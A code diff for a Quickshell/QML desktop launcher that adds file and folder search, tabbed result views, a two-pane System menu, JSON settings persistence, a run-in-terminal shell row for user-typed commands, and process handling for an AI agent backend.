+    statProc.command = ["timeout", "5", "stat", "-c", "%Y\t%n", "--"].concat(paths)
+    statProc.running = true
+  }
+
+  function applyFileMtimes(map) {
+    var next = ({})
+    for (var known in root.fileMtimes) next[known] = root.fileMtimes[known]
+    for (var path in map) next[path] = map[path]
+    root.fileMtimes = next
+    for (var i = 0; i < root.fileResults.length; i++) {
+      var ms = next[root.fileResults[i].path]
+      if (ms !== undefined) root.fileResults[i].mtimeMs = ms
+    }
+    root.rebuildDisplay(true)
+  }
+
+  function cancelFileSearch() {
+    fileDebounce.stop()
+    root.fileSearchGen += 1
+    root.fileRerunPending = false
+    if (dirSearchProc.running) dirSearchProc.running = false
+    if (fileSearchProc.running) fileSearchProc.running = false
+    root.fileSearching = false
+  }
+
+  // Rows for the current results. While fd is still answering a newer query,
+  // the previous results are re-ranked against it instead of vanishing: fd
+  // matches the full path, so typing further only ever narrows them, and the
+  // list settles in place rather than blinking empty on every keystroke.
+  function fileRows(spec, limit) {
+    if (!spec || spec.scope !== root.fileResultsScope) return []
+    var ranked = FileSearch.rankResults(root.fileResults, spec.query, limit, root.homeDir, root.fileSortMode)
+    var now = Date.now()
+    var rows = []
+    for (var i = 0; i < ranked.length; i++) {
+      var item = ranked[i]
+      rows.push(root.queryRow({
+        id: (item.isDir ? "folder:" : "file:") + item.path,
+        kind: item.isDir ? "folder" : "file",
+        icon: item.icon,
+        label: item.name,
+        detail: item.dir,
+        payload: item.path,
+        trail: item.mtimeMs ? FileSearch.formatMtime(item.mtimeMs, now) : ""
+      }))
+    }
+    return rows
+  }
+
+  function filesTabRows() {
+    return root.fileRows(root.fileSearchSpec(), root.fileDisplayLimit)
+  }
+
+  // The kind-split halves All needs from one combined search.
+  function fileSectionRows(isDir) {
+    var rows = root.fileRows(root.fileSearchSpec(), root.fileDisplayLimit)
+    var out = []
+    for (var i = 0; i < rows.length; i++) if ((rows[i].kind === "folder") === isDir) out.push(rows[i])
+    return out
+  }
+
+  function selectedFileRow() {
+    if (!root.cursorActive || root.selectedIndex < 0 || root.selectedIndex >= displayModel.count) return null
+    var row = displayModel.get(root.selectedIndex)
+    return row && (row.kind === "file" || row.kind === "folder") ? row : null
+  }
+
+  function closeLauncher() {
+    applySerial = requestSerial
+    opened = false
+    filterText = ""
+  }
+
+  // gio open honours Terminal=true desktop entries (a TUI editor opens in a
+  // terminal) where xdg-open would exec it blind. Argument vectors throughout:
+  // a path is never re-parsed by a shell.
+  function openPath(path) {
+    if (!path) return
+    root.closeLauncher()
+    Quickshell.execDetached(["gio", "open", path])
+  }
+
+  function enclosingDir(row) {
+    if (row.kind === "folder") return row.target
+    var slash = row.target.lastIndexOf("/")
+    return slash > 0 ? row.target.slice(0, slash) : root.homeDir
+  }
+
+  function openEnclosingFolder(row) {
+    root.openPath(root.enclosingDir(row))
+  }
+
+  function copyPath(row) {
+    root.closeLauncher()
+    Quickshell.execDetached(["wl-copy", "--", row.target])
+  }
+
+  // "shell <command>": run it in a new terminal. The command is the user's
+  // own, typed on purpose, so it runs as written -- but it reaches bash as a
+  // positional argument (eval "$1"), never spliced into the script, and the
+  // terminal drops into an interactive shell afterwards so the output stays
+  // readable (ping sme.sk, then Ctrl+C, and the window is still there).
+  function shellRow(query) {
+    var match = String(query || "").match(/^shell\s+([\s\S]+)$/i)
+    if (!match) return null
+    var command = match[1].trim()
+    if (!command) return null
+    return root.queryRow({
+      kind: "shell",
+      icon: "",
+      label: command,
+      detail: "Run in a new terminal",
+      payload: command
+    })
+  }
+
+  function runInTerminal(command) {
+    if (!command) return
+    root.closeLauncher()
+    Quickshell.execDetached(["xdg-terminal-exec", "--dir=" + root.homeDir, "--",
+      "bash", "-lc", 'eval "$1"; exec "${SHELL:-bash}"', "bash", command])
+  }
+
+  function openTerminalAt(row) {
+    root.closeLauncher()
+    // The equals form: xdg-terminal-exec reads "--dir DIR" as a command.
+    Quickshell.execDetached(["xdg-terminal-exec", "--dir=" + root.enclosingDir(row)])
+  }
+
+  function toggleAppsView() {
+    root.appsView = root.appsView === "grid" ? "list" : "grid"
+    root.saveState()
+    Qt.callLater(function() { if (displayModel.count > 0) root.revealCursor() })
+  }
+
+  // Arrow keys in the grid: sideways by one tile, up and down by a row.
+  // Unlike the list it does not wrap -- off the edge of a grid is nowhere.
+  function gridMove(delta) {
+    if (displayModel.count === 0) return
+    root.disarmPointer()
+    if (!root.cursorActive) {
+      root.cursorActive = true
+      root.selectedIndex = 0
+    } else {
+      root.selectedIndex = Math.max(0, Math.min(displayModel.count - 1, root.selectedIndex + delta))
+    }
+    root.revealCursor()
+  }
+
+  // style.json: the card's geometry, per user. Missing keys fall back to the
+  // defaults below, out-of-range values are ignored, and a file that does not
+  // exist yet is written with the defaults so the options are there to edit.
+  // The defaults keep the stock menu's full-size text and rows that fit their
+  // content, but are wide enough for the tabs to sit on one line and pinned
+  // near the top, so the card grows downward instead of re-centring as it
+  // fills:
+  //   fontScale     every text and icon size (stock menu: 1.0)
+  //   cardWidth     launcher width in Style.space() units (stock menu: 300)
+  //   bodyHeight    results area, share of the screen height (stock menu: 0.7)
+  //   fixedHeight   true keeps the card one size; false fits the rows
+  //   top           "center" (stock menu) or a share of the screen, e.g. 0.2
+  //   pickerHeight  most of the screen a dmenu picker's list may take
+  readonly property var styleDefaults: ({
+    fontScale: 1.0, cardWidth: 560, bodyHeight: 0.6, fixedHeight: false, top: 0.2, pickerHeight: 0.7
+  })
+
+  function loadStyle() {
+    if (styleReadProc.running) return
+    styleReadProc.command = root.readFileCommand(root.stylePath, 8192)
+    styleReadProc.running = true
+  }
+
+  function applyStyle(text, exists) {
+    var style = null
+    var raw = String(text || "").trim()
+    if (raw) {
+      try { style = JSON.parse(raw) } catch (e) {
+        console.warn("[omarchy-menu-omni] style.json is not valid JSON; using defaults")
+      }
+    }
+    if (!style || typeof style !== "object" || Array.isArray(style)) style = ({})
+    var d = root.styleDefaults
+    function num(key, min, max) {
+      var v = Number(style[key])
+      return (style[key] !== undefined && isFinite(v) && v >= min && v <= max) ? v : d[key]
+    }
+    root.menuFontScale = num("fontScale", 0.5, 2)
+    root.launcherCardWidth = Math.round(num("cardWidth", 200, 2000))
+    root.launcherBodyFraction = num("bodyHeight", 0.1, 0.95)
+    root.menuHeightFraction = num("pickerHeight", 0.1, 0.95)
+    root.launcherFixedHeight = typeof style.fixedHeight === "boolean" ? style.fixedHeight : d.fixedHeight
+    var top = style.top
+    root.launcherTopFraction = (typeof top === "number" && isFinite(top) && top >= 0 && top <= 0.9) ? top : -1
+    if (!exists) root.writeStyleDefaults()
+  }
+
+  function writeStyleDefaults() {
+    if (styleWriteProc.running) return
+    styleWriteProc.command = ["bash", "-c",
+      'umask 077; mkdir -p -- "$1" && [ ! -e "$2" ] || exit 0; t=$(mktemp -- "$2.XXXXXX") || exit 1; printf %s "$3" > "$t" && mv -n -- "$t" "$2"; rm -f -- "$t"',
+      "bash", root.stateDir, root.stylePath, JSON.stringify(root.styleDefaults, null, 2) + "\n"]
+    styleWriteProc.running = true
+  }
+
+  function loadState() {
+    if (stateReadProc.running) return
+    stateReadProc.command = root.readFileCommand(root.statePath, 4096)
+    stateReadProc.running = true
+  }
+
+  // A missing file, or one without the ordering keys, is written back with
+  // the defaults filled in: the options are then there to be edited.
+  function applyState(text) {
+    var state = null
+    var raw = String(text || "").trim()
+    if (raw) {
+      try { state = JSON.parse(raw) } catch (e) {
+        // Leave a file that does not parse alone rather than overwrite what
+        // may be a half-finished edit.
+        console.warn("[omarchy-menu-omni] state.json is not valid JSON; using defaults")
+        return
+      }
+    }
+    if (!state || typeof state !== "object" || Array.isArray(state)) state = ({})
+    root.stateData = state
+
+    if (state.appsView === "grid" || state.appsView === "list") root.appsView = state.appsView
+    root.tabOrder = Tabs.normalizeOrder(state.tabOrder, Tabs.DEFAULT_TAB_ORDER)
+    root.allSectionOrder = Tabs.normalizeOrder(state.allSections, Tabs.DEFAULT_ALL_SECTIONS)
+    root.disabledTabs = Tabs.normalizeDisabled(state.disabledTabs)
+
+    // Read after the launcher opened (it re-reads on every open): if All was
+    // just switched off, move on to the first tab that is on.
+    if (root.opened && root.tabsActive && root.activeTab === "all" && !root.tabEnabled("all"))
+      root.setTab(Tabs.firstEnabledTab(root.tabOrder, root.disabledTabs))
+    else if (root.opened) {
+      root.rebuildDisplay(true)
+      root.requestFileSearch()
+    }
+
+    if (!Array.isArray(state.tabOrder) || !Array.isArray(state.allSections)
+        || !Array.isArray(state.disabledTabs) || !state.appsView) root.saveState()
+  }
+
+  // Written to a temporary file and renamed over the old one, so a crash
+  // mid-write cannot leave half a file; the path and the JSON reach the
+  // shell as positional arguments, never as script text.
+  function saveState() {
+    if (stateWriteProc.running) {
+      root.stateSavePending = true
+      return
+    }
+    var next = ({})
+    for (var key in root.stateData) next[key] = root.stateData[key]
+    next.appsView = root.appsView
+    next.tabOrder = root.tabOrder
+    next.allSections = root.allSectionOrder
+    next.disabledTabs = root.disabledTabs
+    if (root.aiAgent) next.aiAgent = root.aiAgent
+    root.stateData = next
+    var json = JSON.stringify(next, null, 2) + "\n"
+    stateWriteProc.command = ["bash", "-c",
+      'umask 077; mkdir -p -- "$1" && t=$(mktemp -- "$2.XXXXXX") || exit 1; printf %s "$3" > "$t" && mv -f -- "$t" "$2" || rm -f -- "$t"',
+      "bash", root.stateDir, root.statePath, json]
+    stateWriteProc.running = true
+  }
+
+  function cycleFileFilter() {
+    if (root.activeTab === "files")
+      root.fileFilterIndex = (root.fileFilterIndex + 1) % FileSearch.FILE_FILTERS.length
+    else if (root.activeTab === "folders")
+      root.folderFilterIndex = (root.folderFilterIndex + 1) % FileSearch.FOLDER_FILTERS.length
+    else return
+    root.selectedIndex = 0
+    root.rebuildDisplay()
+    root.requestFileSearch()
+  }
+
+  function setFileFilter(id) {
+    var list = FileSearch.filtersFor(root.activeTab)
+    for (var i = 0; i < list.length; i++) {
+      if (list[i].id !== id) continue
+      if (root.activeTab === "folders") root.folderFilterIndex = i
+      else root.fileFilterIndex = i
+      root.selectedIndex = 0
+      root.rebuildDisplay()
+      root.requestFileSearch()
+      return
+    }
+  }
+
+  // ------------------------------------------------------ System two panes
+
+  function systemCategoryRows(_serial) {
+    var rows = root.systemTabRows("", "root")
+    for (var i = 0; i < rows.length; i++) rows[i] = MenuModel.sanitizeRow(rows[i])
+    return rows
+  }
+
+  // The top-level category an id sits under ("" for root itself).
+  function systemCategoryOf(id) {
+    var current = String(id || "")
+    while (current && current !== "root") {
+      var entry = root.item(current)
+      if (!entry) return ""
+      if (entry.parent === "root") return current
+      current = entry.parent
+    }
+    return ""
+  }
+
+  // Line the left pane up with whatever the right pane shows: after a route
+  // (`capture` highlights Trigger), after Back, after a drill-down.
+  function syncSystemCategory() {
+    var categories = root.systemCategoryRows(root.layoutSerial)
+    var current = root.systemCategoryOf(root.activeMenu)
+    for (var i = 0; i < categories.length; i++) {
+      if (categories[i].itemId === current) { root.systemCategoryIndex = i; return }
+    }
+    root.systemCategoryIndex = Math.max(0, Math.min(root.systemCategoryIndex, categories.length - 1))
+  }
+
+  function syncSystemCategoryTo(categoryId) {
+    var categories = root.systemCategoryRows(root.layoutSerial)
+    for (var i = 0; i < categories.length; i++)
+      if (categories[i].itemId === categoryId) { root.systemCategoryIndex = i; return }
+  }
+
+  // Browsing the left pane previews the category on the right. A category
+  // that is an action (About) previews nothing; Enter runs it.
+  function selectSystemCategory(index) {
+    var categories = root.systemCategoryRows(root.layoutSerial)
+    if (categories.length === 0) return
+    index = Math.max(0, Math.min(index, categories.length - 1))
+    root.systemCategoryIndex = index
+    var row = categories[index]
+    var target = row.kind === "link" ? row.target : row.itemId
+    root.navStack = []
+    if (row.kind === "menu" || row.kind === "link") root.setActiveMenu(target, false)
+    else root.setActiveMenu("root", false)
+    root.systemPane = "left"
+    root.cursorActive = true
+    root.selectedIndex = 0
+  }
+
+  function enterSystemPanes() {
+    if (!root.systemTwoPane || root.systemMatches.length > 0) return
+    if (root.activeMenu === "root") {
+      root.selectSystemCategory(root.systemCategoryIndex)
+    } else {
+      root.syncSystemCategory()
+      // A top-level category is shown highlighted on the left; anything
+      // deeper puts the keyboard in its list on the right.
+      var entry = root.item(root.activeMenu)
+      root.systemPane = entry && entry.parent === "root" ? "left" : "right"
+    }
+  }
+
+  function activateSystemCategory() {
+    var categories = root.systemCategoryRows(root.layoutSerial)
+    var row = categories[root.systemCategoryIndex]
+    if (!row) return
+    if (row.kind === "menu" || row.kind === "link") {
+      if (displayModel.count === 0) return
+      root.systemPane = "right"
+      root.cursorActive = true
+      root.selectedIndex = root.nextSelectable(0, 1) >= 0 ? root.nextSelectable(0, 1) : 0
+      root.revealCursor()
+    } else {
+      root.applySelected(row.itemId, row.action)
+    }
+  }
+
+  // Left from the right pane: up one submenu level, or back to the left pane
+  // once at the category itself.
+  function systemBack() {
+    if (root.activeMenu !== "root" && root.item(root.activeMenu)
+        && root.item(root.activeMenu).parent !== "root") {
+      root.goBack()
+      root.systemPane = "right"
+      return
+    }
+    root.systemPane = "left"
+  }
+
+  // Switching tab keeps whatever was typed: the same question, asked of
+  // another source. The System tab keeps its place in the menu too.
+  function setTab(id) {
+    if (!Tabs.isTab(id) || root.dmenuActive) return
+    panel.freezeCardTop()
+    root.activeTab = id
+    root.selectedIndex = 0
+    root.cursorActive = true
+    // Switching to System by hand starts at the top of the tree, not on
+    // whatever was browsed last. (Routes such as `capture` open a specific
+    // place and go through openRoute, not here.)
+    if (id === "system" && !root.filterText.trim()) {
+      root.activeMenu = "root"
+      root.navStack = []
+      root.systemCategoryIndex = 0
+    }
+    if (id === "system") Qt.callLater(root.enterSystemPanes)
+    root.disarmPointer()
+    if (id === "apps") root.loadProviderForMenu("apps")
+    if (root.filterText.trim()) root.loadProvidersForSearch()
+    root.updateSystemMatches()
+    root.rebuildDisplay()
+    if (root.systemTwoPane && root.systemMatches.length > 0) root.jumpToSystemMatch(0)
+    root.requestFileSearch()
   }
 
   function depthFor(id) {
@@ -837,7 +1857,8 @@ Item {
       action: "",
       provider: "",
       score: -1,
-      section: ""
+      section: "",
+      trailText: spec.trail || ""
     }
   }
 
@@ -851,6 +1872,7 @@ Item {
   // it, since "ml" is not money.
   function queryRows(query) {
     var builders = [
+      root.shellRow,
       root.calculatorRow,
       root.currencyRow,
       root.unitRow,
@@ -1444,7 +2466,8 @@ Item {
         action: "",
         provider: "",
         score: i,
-        section: ""
+        section: "",
+        trailText: ""
       }))
     }
 
@@ -1459,11 +2482,141 @@ Item {
     })
   }
 
-  function rebuildDisplay() {
+  // How many rows each source gets in All before its own tab is the place to
+  // look further.
+  readonly property int allSectionLimit: 5
+
+  // Menu entries under `scope` matching `query`, best first. Applications are
+  // never part of it: they have their own tab and their own section.
+  // `markDrilldown` splits direct children from deeper matches with the
+  // divider the System tab has always drawn; All sections them itself.
+  function systemSearchRows(query, scope, markDrilldown) {
+    var currentRows = []
+    var drilldownRows = []
+
+    for (var i = 0; i < root.itemOrder.length; i++) {
+      var entry = root.item(root.itemOrder[i])
+      if (!entry || entry.id === "root") continue
+      if (root.isAppEntry(entry)) continue
+      if (!root.isDescendantOf(entry.id, scope)) continue
+      var score
+      if (root.matchesQuery(entry, query)) {
+        score = root.searchScore(entry, query)
+      } else {
+        // "update omarchy": matched along the path, ranked by the terms the
+        // entry matched itself, after every direct match.
+        var ownTerms = MenuModel.pathMatchTerms(root.items, entry, query, root.isVisible(entry))
+        if (ownTerms === null) continue
+        score = root.searchScore(entry, ownTerms) + 100000000
+      }
+
+      var row = root.displayRow(entry, root.parentPathFor(entry.id), score)
+      if (entry.parent === scope) currentRows.push(row)
+      else drilldownRows.push(row)
+    }
+
+    var searchSort = function(a, b) {
+      if (a.score !== b.score) return a.score - b.score
+      return a.path.localeCompare(b.path)
+    }
+    currentRows.sort(searchSort)
+    drilldownRows.sort(searchSort)
+
+    if (markDrilldown && currentRows.length > 0 && drilldownRows.length > 0) {
+      root.searchDivider = true
+      for (var d = 0; d < drilldownRows.length; d++) drilldownRows[d].section = "drilldown"
+    }
+    return currentRows.concat(drilldownRows)
+  }
+
+  // The System tab: the menu as it always was, minus applications.
+  function systemTabRows(query, active) {
+    var rows = []
+    if (query) {
+      // The launcher's System tab searches the whole menu: with two panes the
+      // active menu is merely the category being browsed, not a scope anyone
+      // chose. (Without tabs -- never the case here -- the stock submenu
+      // scope still applies.)
+      var scope = root.tabsActive ? "root" : active
+      rows = root.queryRows(query).concat(root.systemSearchRows(query, scope, true))
+      // Nothing in the menu, and nothing that answered itself. Offer to look
+      // it up rather than showing the empty state.
+      if (rows.length === 0) {
+        var fallback = root.webSearchRow(query)
+        if (fallback) rows.push(fallback)
+      }
+      return rows
+    }
+
+    for (var j = 0; j < root.itemOrder.length; j++) {
+      var child = root.item(root.itemOrder[j])
+      if (!child || child.parent !== active) continue
+      if (root.hiddenFromList(child) || root.isAppEntry(child)) continue
+      if (!root.isVisible(child)) continue
+      rows.push(root.displayRow(child, child.description, child.order))
+    }
+    return rows
+  }
+
+  // The Apps tab: every application, alphabetical, or the matches for the
+  // query, best first. DesktopEntries can reorder its values when an
+  // application starts, so the order is imposed here rather than inherited.
+  function appTabRows(query) {
+    var rows = []
+    for (var i = 0; i < root.itemOrder.length; i++) {
+      var entry = root.item(root.itemOrder[i])
+      if (!entry || entry.kind !== "app") continue
+      if (query && !root.matchesQuery(entry, query)) continue
+      rows.push(root.displayRow(entry, entry.description, query ? root.searchScore(entry, query) : 0))
+    }
+
+    rows.sort(function(a, b) {
+      if (query && a.score !== b.score) return a.score - b.score
+      var aLabel = String(a.label || "").toLowerCase()
+      var bLabel = String(b.label || "").toLowerCase()
+      if (aLabel !== bLabel) return aLabel < bLabel ? -1 : 1
+      return String(a.itemId || "") < String(b.itemId || "") ? -1 : 1
+    })
+    return rows
+  }
+
+  // All: nothing until something is typed, then the answers that computed
+  // themselves on top and a section per source under them.
+  function allTabRows(query) {
+    if (!query) return []
+
+    var sections = []
+    var order = Tabs.orderSections(root.allSectionOrder)
+    for (var i = 0; i < order.length; i++) {
+      var id = order[i].id
+      if (!root.tabEnabled(id)) continue
+      var sectionRows = id === "apps" ? root.appTabRows(query)
+        : id === "files" ? root.fileSectionRows(false)
+        : id === "folders" ? root.fileSectionRows(true)
+        : root.systemSearchRows(query, "root", false)
+      sections.push({ title: order[i].title, rows: sectionRows })
+    }
+    var rows = root.queryRows(query).concat(Tabs.composeSections(sections, root.allSectionLimit))
+
+    if (rows.length === 0) {
+      var fallback = root.webSearchRow(query)
+      if (fallback) rows.push(fallback)
+    }
+    return rows
+  }
+
+  // keepSelection: the list is being rebuilt under an unchanged query (late
+  // results, a provider refresh), so the cursor follows its item rather than
+  // staying on an index that now holds something else.
+  function rebuildDisplay(keepSelection) {
     if (root.dmenuActive) {
       root.rebuildDmenuDisplay()
       return
     }
+
+    var previousId = ""
+    if (keepSelection && root.selectedIndex >= 0 && root.selectedIndex < displayModel.count)
+      previousId = displayModel.get(root.selectedIndex).itemId
 
     displayModel.clear()
 
@@ -1471,78 +2624,31 @@ Item {
 
     var active = root.item(root.activeMenu) ? root.activeMenu : "root"
     root.activeMenu = active
-    var rows = []
     var query = root.filterText.trim()
     root.searchDivider = false
 
-    if (query) {
-      var currentRows = []
-      var drilldownRows = []
-
-      for (var i = 0; i < root.itemOrder.length; i++) {
-        var entry = root.item(root.itemOrder[i])
-        if (!entry || entry.id === "root") continue
-        if (!root.isDescendantOf(entry.id, active)) continue
-        if (root.hiddenFromSearch(entry)) continue
-        if (!root.matchesQuery(entry, query)) continue
-
-        var detail = root.parentPathFor(entry.id)
-        var row = root.displayRow(entry, detail, root.searchScore(entry, query))
-        if (entry.parent === active) currentRows.push(row)
-        else drilldownRows.push(row)
-      }
-
-      var searchSort = function(a, b) {
-        if (a.score !== b.score) return a.score - b.score
-        return a.path.localeCompare(b.path)
-      }
-
-      currentRows.sort(searchSort)
-      drilldownRows.sort(searchSort)
-      root.searchDivider = currentRows.length > 0 && drilldownRows.length > 0
-      if (root.searchDivider) {
-        for (var d = 0; d < drilldownRows.length; d++) drilldownRows[d].section = "drilldown"
-      }
-      rows = currentRows.concat(drilldownRows)
-
-      rows = root.queryRows(query).concat(rows)
-
-      // Nothing in the menu, and nothing that answered itself. Offer to look
-      // it up rather than showing the empty state.
-      if (rows.length === 0) {
-        var fallback = root.webSearchRow(query)
-        if (fallback) rows.push(fallback)
-      }
-    } else {
-      for (var j = 0; j < root.itemOrder.length; j++) {
-        var child = root.item(root.itemOrder[j])
-        if (!child || child.parent !== active) continue
-        if (root.hiddenFromList(child)) continue
-        if (!root.isVisible(child)) continue
-        rows.push(root.displayRow(child, child.description, child.order))
-      }
-
-      // DesktopEntries can reorder its values when an application starts.
-      // Keep the Apps menu alphabetical independently of provider refreshes.
-      if (active === "apps") {
-        rows.sort(function(a, b) {
-          var aLabel = String(a.label || "").toLowerCase()
-          var bLabel = String(b.label || "").toLowerCase()
-          if (aLabel < bLabel) return -1
-          if (aLabel > bLabel) return 1
-          var aId = String(a.itemId || "")
-          var bId = String(b.itemId || "")
-          if (aId < bId) return -1
-          if (aId > bId) return 1
-          return 0
-        })
-      }
-    }
+    var rows = []
+    // A question for the agent is not also a search: the AI panel takes the
+    // card's body, and nothing is looked up until Enter.
+    if (root.isAiMode) rows = []
+    // Two panes show the active menu's own entries, never filtered: a search
+    // moves the selection instead. A category that is an action (About) has
+    // no entries to show, and "root" would otherwise list the categories
+    // again on the right.
+    else if (root.activeTab === "system" && root.systemTwoPane)
+      rows = active === "root" ? [] : root.systemTabRows("", active)
+    else if (root.activeTab === "system") rows = root.systemTabRows(query, active)
+    else if (root.activeTab === "apps") rows = root.appTabRows(query)
+    else if (root.activeTab === "all") rows = root.allTabRows(query)
+    else if (root.activeTab === "files" || root.activeTab === "folders") rows = root.filesTabRows()
 
     // Sanitized here rather than in each builder: this is the one place
     // every row passes through on its way to the ListView.
     for (var k = 0; k < rows.length; k++) displayModel.append(MenuModel.sanitizeRow(rows[k]))
     layoutSerial += 1
+
+    var kept = Tabs.indexOfItem(rows, previousId)
+    if (kept >= 0) selectedIndex = kept
 
     if (displayModel.count === 0) selectedIndex = 0
     else if (selectedIndex >= displayModel.count) selectedIndex = displayModel.count - 1
@@ -1558,6 +2664,10 @@ Item {
   // hidden row peeking past the cursor in the direction of travel.
   function revealCursor() {
     if (displayModel.count === 0) return
+    if (root.gridActive) {
+      appGrid.positionViewAtIndex(root.selectedIndex, GridView.Contain)
+      return
+    }
     resultList.positionViewAtIndex(root.selectedIndex, ListView.Contain)
 
     var item = resultList.itemAtIndex(root.selectedIndex)
@@ -1595,7 +2705,55 @@ Item {
     root.cursorActive = root.mode !== "input"
     root.disarmPointer()
     if (!root.dmenuActive && root.filterText.trim()) root.loadProvidersForSearch()
+    root.updateSystemMatches()
     root.rebuildDisplay()
+    if (root.systemTwoPane && root.systemMatches.length > 0) root.jumpToSystemMatch(0)
+    root.requestFileSearch()
+  }
+
+  // Menu entries matching the query, best first (ids).
+  function updateSystemMatches() {
+    var query = root.filterText.trim()
+    if (!query || !root.tabsActive || root.activeTab !== "system" || root.isAiMode) {
+      root.systemMatches = []
+      root.systemMatchIndex = 0
+      return
+    }
+    var rows = root.systemSearchRows(query, "root", false)
+    var ids = []
+    for (var i = 0; i < rows.length; i++) ids.push(rows[i].itemId)
+    root.systemMatches = ids
+    root.systemMatchIndex = 0
+  }
+
+  // Put the tree on a match: open the menu it lives in and park the cursor on
+  // it, or -- for a top-level category -- highlight it on the left. The query
+  // stays; Esc clears it and leaves the tree where it is.
+  function jumpToSystemMatch(index) {
+    var count = root.systemMatches.length
+    if (count === 0) return
+    index = ((index % count) + count) % count
+    root.systemMatchIndex = index
+    var entry = root.item(root.systemMatches[index])
+    if (!entry) return
+    root.navStack = []
+    root.cursorActive = true
+    if (entry.parent === "root") {
+      root.activeMenu = (entry.kind === "menu") ? entry.id : (entry.kind === "link" ? entry.target : "root")
+      root.rebuildDisplay()
+      root.syncSystemCategoryTo(entry.id)
+      root.systemPane = "left"
+      root.selectedIndex = 0
+      return
+    }
+    root.activeMenu = entry.parent
+    root.rebuildDisplay()
+    root.syncSystemCategory()
+    root.systemPane = "right"
+    for (var i = 0; i < displayModel.count; i++) {
+      if (displayModel.get(i).itemId === entry.id) { root.selectedIndex = i; break }
+    }
+    root.revealCursor()
   }
 
   function setActiveMenu(id, pushHistory, fromPointer) {
@@ -1604,6 +2762,7 @@ Item {
     if (pushHistory && id !== root.activeMenu) root.navStack = root.navStack.concat([root.activeMenu])
     root.activeMenu = id
     root.filterText = ""
+    root.systemMatches = []
     root.selectedIndex = 0
     root.cursorActive = true
     if (fromPointer) pointerGate.allowInitialSample()
@@ -1615,6 +2774,7 @@ Item {
 
   function goBack() {
     if (root.activeMenu === "root") return false
+    if (root.systemTwoPane) Qt.callLater(root.syncSystemCategory)
 
     if (root.navStack.length > 0) {
       var previous = root.navStack[root.navStack.length - 1]
@@ -1645,7 +2805,13 @@ Item {
 
     var row = displayModel.get(index)
     if (row.kind === "menu" || row.kind === "link") {
-      root.setActiveMenu(row.target || row.itemId, true, fromPointer)
+      // A submenu found from All is entered where submenus live, with the
+      // left pane lined up on it rather than on whatever was browsed last.
+      var fromOtherTab = root.activeTab !== "system"
+      if (fromOtherTab) root.activeTab = "system"
+      root.setActiveMenu(row.target || row.itemId, !fromOtherTab, fromPointer)
+      if (fromOtherTab) root.navStack = []
+      if (root.systemTwoPane) root.enterSystemPanes()
     } else if (row.kind === "app") {
       var appId = row.appId
       var label = row.label
@@ -1653,6 +2819,10 @@ Item {
       opened = false
       filterText = ""
       root.launchApp(appId, label)
+    } else if (row.kind === "shell") {
+      root.runInTerminal(row.target)
+    } else if (row.kind === "file" || row.kind === "folder") {
+      root.openPath(row.target)
     } else if (row.kind === "kill") {
       root.killProcess(row.target)
     } else if (row.kind === "url" || row.kind === "websearch") {
@@ -1812,6 +2982,212 @@ Item {
   // way in.
   ListModel { id: displayModel }
 
+  Process {
+    id: styleReadProc
+    stdout: StdioCollector { id: styleReadOut; waitForEnd: true }
+    onExited: function(exitCode) { root.applyStyle(styleReadOut.text, exitCode === 0) }
+  }
+
+  Process { id: styleWriteProc }
+
+  Process {
+    id: stateReadProc
+    stdout: StdioCollector { id: stateReadOut; waitForEnd: true }
+    onExited: root.applyState(stateReadOut.text)
+  }
+
+  // A save asked for while one is being written is not dropped: it runs as
+  // soon as the first finishes.
+  property bool stateSavePending: false
+
+  Process {
+    id: stateWriteProc
+    onExited: {
+      if (!root.stateSavePending) return
+      root.stateSavePending = false
+      Qt.callLater(root.saveState)
+    }
+  }
+
+  // ai.json, then the Omarchy default agent; applied once both are in. A
+  // missing file reads as empty, which AiConfig treats as "use defaults".
+  Process {
+    id: aiConfigProc
+    stdout: StdioCollector { id: aiConfigOut; waitForEnd: true }
+    onExited: function(exitCode) {
+      root.aiConfigPendingRaw = exitCode === 0 ? String(aiConfigOut.text || "") : null
+      aiAgentProc.command = root.readFileCommand(root.omarchyAgentPath, 4096)
+      aiAgentProc.running = true
+    }
+  }
+
+  Process {
+    id: aiAgentProc
+    stdout: StdioCollector { id: aiAgentOut; waitForEnd: true }
+    onExited: function(exitCode) {
+      root.applyAiConfig(root.aiConfigPendingRaw, exitCode === 0 ? String(aiAgentOut.text || "") : "")
+    }
+  }
+
+  Process {
+    id: aiAgentProbe
+    stdout: StdioCollector { id: aiAgentProbeOut; waitForEnd: true }
+    onExited: root.applyAiAgentProbe(aiAgentProbeOut.text)
+  }
+
+  Process {
+    id: aiBinaryCheck
+    property string checkingFor: ""
+    onExited: function(exitCode) {
+      if (aiBinaryCheck.checkingFor === root.aiBinaryCheckedFor) {
+        root.aiBinaryMissing = exitCode !== 0
+        root.aiBinaryChecked = true
+      } else {
+        Qt.callLater(root.ensureAiBinaryChecked)
+      }
+    }
+  }
+
+  // Two slots alternate per generation; only aiDispatchOrQueue and
+  // aiTryDispatchPending may set command/running on them.
+  Process {
+    id: aiProcA
+    property int gen: 0
+    onStarted: aiProcA.stdinEnabled = false
+    stdout: SplitParser { onRead: function(line) { root.onAiLine(aiProcA.gen, line) } }
+    stderr: SplitParser { onRead: function(line) { root.onAiStderr(aiProcA.gen, line) } }
+    onExited: function(exitCode) {
+      aiKillFallbackTimerA.stop()
+      aiKillFallbackTimerA.targetPid = null
+      root.onAiExit(aiProcA.gen, exitCode)
+      Qt.callLater(root.aiTryDispatchPending)
+    }
+  }
+
+  Process {
+    id: aiProcB
+    property int gen: 0
+    onStarted: aiProcB.stdinEnabled = false
+    stdout: SplitParser { onRead: function(line) { root.onAiLine(aiProcB.gen, line) } }
+    stderr: SplitParser { onRead: function(line) { root.onAiStderr(aiProcB.gen, line) } }
+    onExited: function(exitCode) {
+      aiKillFallbackTimerB.stop()
+      aiKillFallbackTimerB.targetPid = null
+      root.onAiExit(aiProcB.gen, exitCode)
+      Qt.callLater(root.aiTryDispatchPending)
+    }
+  }
+
+  // The agent runs in its own process group (setsid, AiBackend.wrapForGroup);
+  // anything in it still alive half a second after SIGTERM gets SIGKILL.
+  Timer {
+    id: aiKillFallbackTimerA
+    property var targetPid: null
+    interval: 500
+    onTriggered: {
+      if (aiKillFallbackTimerA.targetPid) {
+        Quickshell.execDetached(AiBackend.killArgv(aiKillFallbackTimerA.targetPid, "KILL"))
+        aiKillFallbackTimerA.targetPid = null
+      }
+    }
+  }
+
+  Timer {
+    id: aiKillFallbackTimerB
+    property var targetPid: null
+    interval: 500
+    onTriggered: {
+      if (aiKillFallbackTimerB.targetPid) {
+        Quickshell.execDetached(AiBackend.killArgv(aiKillFallbackTimerB.targetPid, "KILL"))
+        aiKillFallbackTimerB.targetPid = null
+      }
+    }
